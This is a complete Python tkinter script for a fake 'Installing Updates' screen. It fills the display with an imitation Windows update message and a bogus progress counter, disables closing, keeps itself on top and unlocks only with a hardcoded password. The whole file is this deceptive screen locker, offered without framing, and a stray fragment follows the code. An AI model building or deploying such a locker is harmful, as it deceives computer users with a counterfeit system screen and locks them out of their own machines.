import tkinter as tk
from tkinter import messagebox

EXIT_PASSWORD = "letmein123"

def unlock_system(root, entry):
    if entry.get() == EXIT_PASSWORD:
        root.destroy()
    else:
        messagebox.showerror("Access Denied", "Incorrect command.")

def lock_screen():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg="black")
    root.title("Installing Updates")

    # Disable Alt+F4
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    # Block Alt+Tab by always being on top
    root.attributes('-topmost', True)

    # Label - Update Message
    label = tk.Label(root,
                     text="Working on updates\nPlease don't turn off your computer.",
                     font=("Segoe UI", 26),
                     fg="white",
                     bg="black")
    label.pack(pady=100)

    # Fake progress % label
    progress = tk.Label(root,
                        text="0%",
                        font=("Segoe UI", 30),
                        fg="white",
                        bg="black")
    progress.pack()

    # Progress updater
    def update_progress(val=0):
        if val <= 100:
            progress.config(text=f"{val}%")
            root.after(120, lambda: update_progress(val + 1))
        else:
            progress.config(text="Finalizing updates...")

    update_progress()

    # Bottom Frame for Textbox
    bottom_frame = tk.Frame(root, bg="black")
    bottom_frame.pack(side="bottom", pady=20)

    command_label = tk.Label(bottom_frame,
                             text="Enter command to unlock:",
                             font=("Segoe UI", 14),
                             fg="gray",
                             bg="black")
    command_label.pack()

    entry = tk.Entry(bottom_frame, font=("Segoe UI", 14), width=30, justify='center', show='*')
    entry.pack(pady=5)
    entry.focus()

    # Enter key triggers unlock check
    entry.bind("<Return>", lambda e: unlock_system(root, entry))

    root.mainloop()

if __name__ == "__main__":
    lock_screen()
le